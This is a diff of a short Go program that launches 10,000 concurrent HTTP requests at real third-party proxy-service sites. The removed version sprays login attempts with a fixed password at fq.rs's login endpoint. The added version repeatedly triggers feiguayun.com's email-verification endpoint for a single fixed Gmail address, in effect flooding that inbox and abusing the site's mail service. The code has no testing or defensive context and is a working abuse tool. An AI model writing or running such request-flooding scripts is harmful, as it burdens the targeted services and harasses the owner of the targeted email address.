@@ -3,28 +3,24 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"math/rand"
 	"net/http"
 	"net/url"
-	"strconv"
-	"strings"
 	"time"
 )
 
 func main() {
 	ch2 := make(chan interface{})
 	for i := 0; i < 10000; i++ {
-
-		go httpPostForm(string(rand.Int())+"@gmail.com", ch2)
+		go httpPostForm("1234qwer@gmail.com", ch2)
 	}
 	i := 0
 	for {
 		select {
 		case u := <-ch2:
-			println(u)
+			print(u)
 			i = 0
 		default:
-			println("ok")
+			print("ok")
 			if i > 10 {
 				goto Loop
 			}
@@ -35,17 +31,11 @@ func main() {
 Loop:
 	print("执行完成")
 }
-func zhToUnicode(raw []byte) ([]byte, error) {
-	str, err := strconv.Unquote(strings.Replace(strconv.Quote(string(raw)), `\\u`, `\u`, -1))
-	if err != nil {
-		return nil, err
-	}
-	return []byte(str), nil
-}
+
 func httpPostForm(email string, chanel chan interface{}) {
 	chanel <- email
-	resp, err := http.PostForm("https://fq.rs/api/v1/passport/auth/login",
-		url.Values{"key": {"value"}, "email": {email}, "password": {"fkairport1314"}})
+	resp, err := http.PostForm("https://www.feiguayun.com/api/v1/passport/comm/sendEmailVerify",
+		url.Values{"key": {"value"}, "email": {email}})
 	if err != nil {
 		// handle error
 	}
@@ -55,23 +45,9 @@ func httpPostForm(email string, chanel chan interface{}) {
 	if err != nil {
 		// handle error
 	}
-	textQuoted := string(body)
-	println(textQuoted)
-	textUnquoted := textQuoted[1 : len(textQuoted)-1]
-	sUnicodev := strings.Split(textUnquoted, "\\u")
-	var context string
-	for _, v := range sUnicodev {
-		if len(v) < 1 {
-			continue
-		}
-		temp, err := strconv.ParseInt(v, 16, 32)
-		if err != nil {
-			panic(err)
-		}
-		context += fmt.Sprintf("%c", temp)
-	}
-	fmt.Println(context)
 
-	chanel <- context
+	fmt.Println(string(body))
+
+	chanel <- string(body)
 
 }
